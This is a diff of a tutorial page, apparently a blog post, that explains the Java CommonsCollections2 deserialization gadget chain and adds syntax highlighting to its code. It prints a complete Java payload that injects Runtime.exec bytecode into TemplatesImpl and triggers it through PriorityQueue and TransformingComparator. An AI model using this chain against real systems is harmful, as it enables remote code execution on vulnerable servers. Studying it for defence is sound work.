@@ -142,61 +142,64 @@
 
 <p>So lets First Dive in and understand what is PriorityQueue and how does it works.</p>
 <p>
-    <pre>
-<code>
-    import java.util.PriorityQueue;
-
-public class SimplePriorityQueueDemo {
-    public static void main(String[] args) {
-        PriorityQueue<Integer> pq = new PriorityQueue<>();
-        pq.add(30);
-        pq.add(10);
-        pq.add(20);
-
-        System.out.println("Elements in priority order:");
-        while (!pq.isEmpty()) {
-            System.out.println(pq.poll());
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+    
+    <span style="color: #cf8e6d;">public class</span> SimplePriorityQueueDemo {
+        <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+            PriorityQueue&lt;<span style="color: #cf8e6d;">Integer</span>&gt; pq = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;&gt;();
+            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">30</span>);
+            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">10</span>);
+            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">20</span>);
+    
+            System.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Elements in priority order:"</span>);
+            <span style="color: #cf8e6d;">while</span> (!pq.<span style="color: #56a8f5;">isEmpty</span>()) {
+                System.out.<span style="color: #56a8f5;">println</span>(pq.<span style="color: #56a8f5;">poll</span>());
+            }
         }
     }
-}
-</code>
     </pre>
+    </div>
+    
 </p>
 <p>
     On the above code You wil see the numbers getting printed one by One.
 </p>
 <p>Similarly in the priorityQueue Apart blank construcutors there are constructor that takes comparator and compares the numbers that are in the queue</p>
 <p>
-    <pre>
-<code>
-    AnotherClass ob=new AnotherClass()
-    PriorityQueue<String> pq = new PriorityQueue<String>(2,new ob);
-        pq.add("a");
-        pq.add("b")
-</code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    AnotherClass ob = <span style="color: #cf8e6d;">new</span> AnotherClass();
+    PriorityQueue&lt;<span style="color: #cf8e6d;">String</span>&gt; pq = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;<span style="color: #cf8e6d;">String</span>&gt;(2, ob);
+    pq.<span style="color: #56a8f5;">add</span>(<span style="color: #6aab73;">"a"</span>);
+    pq.<span style="color: #56a8f5;">add</span>(<span style="color: #6aab73;">"b"</span>);
     </pre>
+    </div>
+    
 </p>
 <p>
     The Another class looks like below
 </p>
 <p>
-    <pre>
-<code>
-    import java.io.IOException;
-import java.io.Serializable;
-import java.util.Comparator;
-
-public class AnotherClass implements Comparator<String>, Serializable {
-    public int compare(String a, String b) {
-        if(a.equals(b))
-        return 1;
-        else{
-            return -1
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">import</span> java.io.IOException;
+    <span style="color: #cf8e6d;">import</span> java.io.Serializable;
+    <span style="color: #cf8e6d;">import</span> java.util.Comparator;
+    
+    <span style="color: #cf8e6d;">public class</span> AnotherClass <span style="color: #cf8e6d;">implements</span> Comparator&lt;<span style="color: #cf8e6d;">String</span>&gt;, Serializable {
+        <span style="color: #cf8e6d;">public int</span> <span style="color: #56a8f5;">compare</span>(<span style="color: #cf8e6d;">String</span> a, <span style="color: #cf8e6d;">String</span> b) {
+            <span style="color: #cf8e6d;">if</span> (a.<span style="color: #56a8f5;">equals</span>(b))
+                <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">1</span>;
+            <span style="color: #cf8e6d;">else</span> {
+                <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">-1</span>;
+            }
         }
     }
-}
-</code>
     </pre>
+    </div>
+    
 </p>
 <p>So the priorituQueue will execute the Compare Method Writeen on the AnotherClass.java file and will obtain the ouput</p>
 <p>So basically the Constructor takes a comparator , executes the compare function present on it and then obtains the Output.</p>
@@ -207,29 +210,33 @@ public class AnotherClass implements Comparator<String>, Serializable {
     Examining the PriorityQueue, it has a readObject block that looks like Below.
 </p>
 <p>
-    <pre>
-<code>
-    private void readObject(java.io.ObjectInputStream s)
-    throws java.io.IOException, ClassNotFoundException {
-    // Read in size, and any hidden stuff
-    s.defaultReadObject();
-
-    // Read in (and discard) array length
-    s.readInt();
-
-    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, size);
-    final Object[] es = queue = new Object[Math.max(size, 1)];
-
-    // Read in all elements.
-    for (int i = 0, n = size; i < n; i++)
-        es[i] = s.readObject();
-
-    // Elements are guaranteed to be in "proper order", but the
-    // spec has never explained what that might be.
-    heapify();
-}
-</code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">private void</span> <span style="color: #56a8f5;">readObject</span>(java.io.ObjectInputStream s)
+        <span style="color: #cf8e6d;">throws</span> java.io.IOException, ClassNotFoundException {
+        
+        <span style="color: #6aab73;">// Read in size, and any hidden stuff</span>
+        s.<span style="color: #56a8f5;">defaultReadObject</span>();
+    
+        <span style="color: #6aab73;">// Read in (and discard) array length</span>
+        s.<span style="color: #56a8f5;">readInt</span>();
+    
+        SharedSecrets.<span style="color: #56a8f5;">getJavaObjectInputStreamAccess</span>()
+            .<span style="color: #56a8f5;">checkArray</span>(s, Object[].<span style="color: #cf8e6d;">class</span>, size);
+    
+        <span style="color: #cf8e6d;">final Object</span>[] es = queue = <span style="color: #cf8e6d;">new Object</span>[Math.<span style="color: #56a8f5;">max</span>(size, <span style="color: #b3ae60;">1</span>)];
+    
+        <span style="color: #6aab73;">// Read in all elements.</span>
+        <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">int</span> i = <span style="color: #b3ae60;">0</span>, n = size; i &lt; n; i++)
+            es[i] = s.<span style="color: #56a8f5;">readObject</span>();
+    
+        <span style="color: #6aab73;">// Elements are guaranteed to be in "proper order", but the</span>
+        <span style="color: #6aab73;">// spec has never explained what that might be.</span>
+        <span style="color: #56a8f5;">heapify</span>();
+    }
     </pre>
+    </div>
+    
 </p>
 <p>
     The heapify() check if the comparator is null and if its not null it calls the siftDownUsingComparator().<br>
@@ -239,127 +246,138 @@ public class AnotherClass implements Comparator<String>, Serializable {
 
 <p>Now Lets Jump into the Payload</p>
 <p>
-    <pre>
-<code>
-    public Queue&#60;Object&#62; getObject(final String command) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(command);
-        // mock method name until armed
-        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-        // create queue with numbers and basic comparator
-        final PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2,new TransformingComparator(transformer));
-        // stub data for replacement later
-        queue.add(1);
-        queue.add(1);
-
-        // switch method called by comparator
-        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
-
-        // switch contents of queue
-        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        queueArray[0] = templates;
-        queueArray[1] = 1;
-
-        return queue;
-    }
-</code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public Queue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
+        <span style="color: #cf8e6d;">final Object</span> templates = Gadgets.<span style="color: #56a8f5;">createTemplatesImpl</span>(command);
     
+        <span style="color: #6aab73;">// mock method name until armed</span>
+        <span style="color: #cf8e6d;">final</span> InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"toString"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
+    
+        <span style="color: #6aab73;">// create queue with numbers and basic comparator</span>
+        <span style="color: #cf8e6d;">final</span> PriorityQueue&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
+    
+        <span style="color: #6aab73;">// stub data for replacement later</span>
+        queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+        queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+    
+        <span style="color: #6aab73;">// switch method called by comparator</span>
+        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformer, <span style="color: #6aab73;">"iMethodName"</span>, <span style="color: #6aab73;">"newTransformer"</span>);
+    
+        <span style="color: #6aab73;">// switch contents of queue</span>
+        <span style="color: #cf8e6d;">final Object</span>[] queueArray = (<span style="color: #cf8e6d;">Object</span>[]) Reflections.<span style="color: #56a8f5;">getFieldValue</span>(queue, <span style="color: #6aab73;">"queue"</span>);
+        queueArray[<span style="color: #b3ae60;">0</span>] = templates;
+        queueArray[<span style="color: #b3ae60;">1</span>] = <span style="color: #b3ae60;">1</span>;
+    
+        <span style="color: #cf8e6d;">return</span> queue;
+    }
     </pre>
+    </div>
+    
 </p>
 <p>We are using TransFormingComparator .So the Compare() on TransFormingComparator will get Executed.<p>
     <p>Lets Take a look into how the Compare() Looks like in the TransFormingCompartor.</p>
     <p>
-        <pre>
-            public int compare(final I obj1, final I obj2) {
-                final O value1 = transformer.apply(obj1);
-                final O value2 = transformer.apply(obj2);
-                return decorated.compare(value1, value2);
-            }
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+        <span style="color: #cf8e6d;">public int</span> <span style="color: #56a8f5;">compare</span>(<span style="color: #cf8e6d;">final</span> I obj1, <span style="color: #cf8e6d;">final</span> I obj2) {
+            <span style="color: #cf8e6d;">final</span> O value1 = transformer.<span style="color: #56a8f5;">apply</span>(obj1);
+            <span style="color: #cf8e6d;">final</span> O value2 = transformer.<span style="color: #56a8f5;">apply</span>(obj2);
+            <span style="color: #cf8e6d;">return</span> decorated.<span style="color: #56a8f5;">compare</span>(value1, value2);
+        }
         </pre>
+        </div>
+        
     </p>
     <p>It calls the Transformer.apply(), This transformer is the same TransFormer That we have passed</p>
     <p>
-        <pre>
-<code>
-    public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
-        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
-    }
-
-    /**
-     * Constructs an instance with the given Transformer and Comparator.
-     *
-     * @param transformer  what will transform the arguments to {@code compare}
-     * @param decorated  the decorated Comparator
-     */
-    public TransformingComparator(final Transformer<? super I, ? extends O> transformer,
-                                  final Comparator<O> decorated) {
-        this.decorated = decorated;
-        this.transformer = transformer; 
-    }
-</code>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+        <span style="color: #cf8e6d;">public</span> TransformingComparator(<span style="color: #cf8e6d;">final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer) {
+            <span style="color: #cf8e6d;">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);
+        }
         
+        /**
+         * Constructs an instance with the given Transformer and Comparator.
+         *
+         * @param transformer  what will transform the arguments to {@code compare}
+         * @param decorated    the decorated Comparator
+         */
+        <span style="color: #cf8e6d;">public</span> TransformingComparator(
+            <span style="color: #cf8e6d;">final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer,
+            <span style="color: #cf8e6d;">final</span> Comparator&lt;O&gt; decorated) {
+            <span style="color: #cf8e6d;">this</span>.decorated = decorated;
+            <span style="color: #cf8e6d;">this</span>.transformer = transformer; 
+        }
         </pre>
+        </div>
+        
     </p>
     <p>And then it assigns it to this.transformer</p>
     <p>So indeed it takes the TransFromer Provided by us and calls the TransForm() Method</p>
     <p>But wait a sec, it calls the apply(), however there is not apply() in invokerTransformer, so there has to be some kind of code for the translation or apply() to transform</p>
     <p>Check the code where the this.transForm is defined</p>
     <p>
-        <pre>
-            private final Transformer<? super I, ? extends O> transformer;
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+        <span style="color: #cf8e6d;">private final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer;
         </pre>
+        </div>
+        
     </p>
     <p>One thing to keep in mind is some modern Java frameworks (like Streams and Lambdas) allow functional interfaces (like Transformer) to be treated like Function<I, O>.</p>
     <p>
         So the below code 
-        <pre>
-        <code>
-    Transformer&#60;String, Integer&#62;transformer = new InvokerTransformer<>("length", null, null);
-    Integer length = transformer.transform("Hello");  // Calls transform() directly
-        </code>
-        </pre>
+        <div style="background-color: #1e1f22; color: #bcbec4;">
+          <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+          Transformer&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">Integer</span>&gt; transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer&lt;&gt;(<span style="color: #6aab73;">"length"</span>, <span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">null</span>);
+          <span style="color: #cf8e6d;">Integer</span> length = transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"Hello"</span>);  <span style="color: #6aab73;">// Calls transform() directly</span>
+          </pre>
+          </div>
+          
         </p>
 
        <p> can also be written as
-       <pre>
-        <code>
-    Function&#60;String, Integer&#62; func = transformer::transform;  // Adapts `Transformer` to `Function`
-    Integer length = func.apply("Hello");  // Calls transform() via apply()
-        </code>
-
-       </pre>
+        <div style="background-color: #1e1f22; color: #bcbec4;">
+          <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+          Function&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">Integer</span>&gt; func = transformer::<span style="color: #56a8f5;">transform</span>;  <span style="color: #6aab73;">// Adapts `Transformer` to `Function`</span>
+          <span style="color: #cf8e6d;">Integer</span> length = func.<span style="color: #56a8f5;">apply</span>(<span style="color: #6aab73;">"Hello"</span>);  <span style="color: #6aab73;">// Calls transform() via apply()</span>
+          </pre>
+          </div>
+          
        </p>
 
 
     </p>
     <p>If you check the SuperClass i.e TransFormer.java you will see the below code</p>
     <p>
-        <pre>
-<code>
-    public interface Transformer&#60;T, R&#62; extends Function&#60;T, R&#62;{
-
-        @Override
-        default R apply(final T t) {
-            return transform(t);
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+        <span style="color: #cf8e6d;">public interface</span> Transformer&lt;T, R&gt; <span style="color: #cf8e6d;">extends</span> Function&lt;T, R&gt; {
+        
+            <span style="color: #cf8e6d;">@Override</span>
+            <span style="color: #cf8e6d;">default</span> R <span style="color: #56a8f5;">apply</span>(<span style="color: #cf8e6d;">final</span> T t) {
+                <span style="color: #cf8e6d;">return</span> <span style="color: #56a8f5;">transform</span>(t);
+            }
+        
+            /**
+             * Transforms the input object into some output object.
+             * <p>
+             * The input object SHOULD be left unchanged.
+             * </p>
+             *
+             * @param input  the object to be transformed, should be left unchanged
+             * @return a transformed object
+             * @throws ClassCastException (runtime) if the input is the wrong class
+             * @throws IllegalArgumentException (runtime) if the input is invalid
+             * @throws FunctorException (runtime) if the transform cannot be completed
+             */
+            R <span style="color: #56a8f5;">transform</span>(T input);
+        
         }
-    
-        /**
-         * Transforms the input object into some output object.
-         * <p>
-         * The input object SHOULD be left unchanged.
-         * </p>
-         *
-         * @param input  the object to be transformed, should be left unchanged
-         * @return a transformed object
-         * @throws ClassCastException (runtime) if the input is the wrong class
-         * @throws IllegalArgumentException (runtime) if the input is invalid
-         * @throws FunctorException (runtime) if the transform cannot be completed
-         */
-        R transform(T input);
-    
-    }
-</code>
         </pre>
+        </div>
+        
     </p>
     <p>This is how the apply function gets converted to transform()</p>
 <p>So in the entire Payload we are using the templateImpl and using InvokerTransFormer to call "toString" on it for the code Execute</p>
@@ -384,137 +402,88 @@ public class AnotherClass implements Comparator<String>, Serializable {
 <p>But the code wiil be slightly different.</p>
 <p>The last 4 lines of the code will look somethingLike below.</p>
 <p>
-    <pre>
-        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
-        PriorityQueue&#60;TemplatesImpl&#60; priorityQueue = new PriorityQueue&#60;TemplatesImpl&#60;(2, new TransformingComparator(transformer));
-        priorityQueue.add(templates);
-        priorityQueue.add(templates);
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"newTransformer"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
+    PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;TemplatesImpl&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
+    priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+    priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
     </pre>
+    </div>
+    
 </p>
 <p>
     The Entire Code along with CreatesImpl for CommonsCollection2 will look like below with the Above Modification.
 </p>
-<p>
-    <pre>
-        <code>
-            import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import java.lang.reflect.Field;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import java.util.PriorityQueue;
-import javax.xml.transform.Templates;
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.functors.*;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-public class cc2 {
-    public static void main(String[] args) throws Exception {
-        String command="calc.exe";
-        ClassPool pool = ClassPool.getDefault();
 
-        /*
-         * So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call
-         * clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName());
-            clazz.setSuperclass(superC);
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+  <span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
+  <span style="color: #cf8e6d;">import</span> javassist.ClassPool;
+  <span style="color: #cf8e6d;">import</span> javassist.CtClass;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+  <span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.Transformer;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.functors.*;
+  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+  
+  <span style="color: #cf8e6d;">public class</span> cc2 {
+      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws Exception</span> {
+          <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"calc.exe"</span>;
+          ClassPool pool = ClassPool.<span style="color: #56a8f5;">getDefault</span>();
+  
+          <span style="color: #6aab73;">/*
+           * Explanation: Creating bytecode that extends AbstractTranslet
+           */</span>
+          <span style="color: #cf8e6d;">final</span> CtClass clazz = pool.<span style="color: #56a8f5;">get</span>(cc2.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+          <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
+              command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\\"</span>, <span style="color: #6aab73;">"\\\\"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\""</span>, <span style="color: #6aab73;">"\\\""</span>) +
+              <span style="color: #6aab73;">"\");"</span>;
+          clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
+          CtClass superC = pool.<span style="color: #56a8f5;">get</span>(AbstractTranslet.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+          clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
+          <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
+          <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
+  
+          <span style="color: #cf8e6d;">TemplatesImpl</span> templates = <span style="color: #cf8e6d;">new</span> TemplatesImpl();
+  
+          Field bytecodesField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
+          bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{ maliciousBytecode });
+  
+          Field nameField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
+          nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
+  
+          Field tfacname = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
+          tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+          tfacname.<span style="color: #56a8f5;">set</span>(templates, TransformerFactoryImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
+  
+          <span style="color: #6aab73;">// Use transformer and transforming comparator</span>
+          InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"newTransformer"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
+          PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;TemplatesImpl&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
+          priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+          priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+  
+          <span style="color: #6aab73;">/*
+          Field field = PriorityQueue.class.getDeclaredField("queue");
+          field.setAccessible(true);
+          final Object[] queueArray = (Object[]) field.get(priorityQueue);
+          queueArray[0] = templates;
+          queueArray[1] = 1;
+          */</span>
+      }
+  }
+  </pre>
+  </div>
+  
 
-            Reason for calling the above 2 are.
-            1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
-            AbstractTranslet.class or else TemplatesIMPL will not execute it(Figure out why)
-         */
 
-
-        final CtClass clazz = pool.get(cc2.class.getName()); 
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        CtClass superC = pool.get(AbstractTranslet.class.getName());
-        clazz.setSuperclass(superC);
-        final byte[] classBytes = clazz.toBytecode();
-
-
-
-        byte[] maliciousBytecode =classBytes;
-    
-
-        /*
-         * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
-         * _tfactory , as these are necessary fields.
-         * Why can't we use the normal getters and setters(FigureOut)
-         */
-        TemplatesImpl templates = new TemplatesImpl();
-
-    
-        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
-        bytecodesField.setAccessible(true);
-        bytecodesField.set(templates, new byte[][]{maliciousBytecode});
-
-       
-        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
-        nameField.setAccessible(true);
-        nameField.set(templates, "Exploit");
-        
-        Field tfacname = TemplatesImpl.class.getDeclaredField("_tfactory");
-        tfacname.setAccessible(true);
-        tfacname.set(templates, TransformerFactoryImpl.class.newInstance());
-
-        //templates.newTransformer();
-
-
-        /*
-         * Below we are using the transformer chain.
-         * The reason why we are taking TemplatesIMPL , we wanted to use InstantiateTransformer instead of invokerTransFromer
-         * InstantiateTransformer takes a class and initiates it as we provide.
-         * 
-         * Why we use TrAxFilter.class
-         * If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.
-         * So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer)
-         * that takes a entry of type Templates.class and calls the newTransformer() method
-         * 
-         * But why so.
-         * 
-         * If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.
-         * 
-         * 
-         *  public T transform(final Class<? extends T> input) {
-            final Constructor<? extends T> con = input.getConstructor(iParamTypes);
-            return con.newInstance(iArgs);
-            }
-         * 
-         * So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return
-         * all the public constrcutors present in there , however it's also passing an argument in getConstructor of 
-         * iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class
-         * 
-         * So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
-         * look?
-         * 
-         * It will look into the TrAXFilter.class for us cause that is what we are passing in.
-         * If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.
-         * 
-         * 
-         * Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way
-         */
-         
-        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
-        PriorityQueue&#60;TemplatesImpl&#60; priorityQueue = new PriorityQueue&#60;TemplatesImpl&#60;(2, new TransformingComparator(transformer));
-        priorityQueue.add(templates);
-        priorityQueue.add(templates);
-        /*
-        Field field = PriorityQueue.class.getDeclaredField("queue");
-        field.setAccessible(true);
-        final Object[] queueArray = (Object[]) field.get(priorityQueue);
-        queueArray[0] = templates;
-		queueArray[1] = 1;
-        */
-        
-    }
-}
-        </code>
-    </pre>
-</p>
 <p>
     <img src="images/cc/cc2popup.PNG">
 </p>
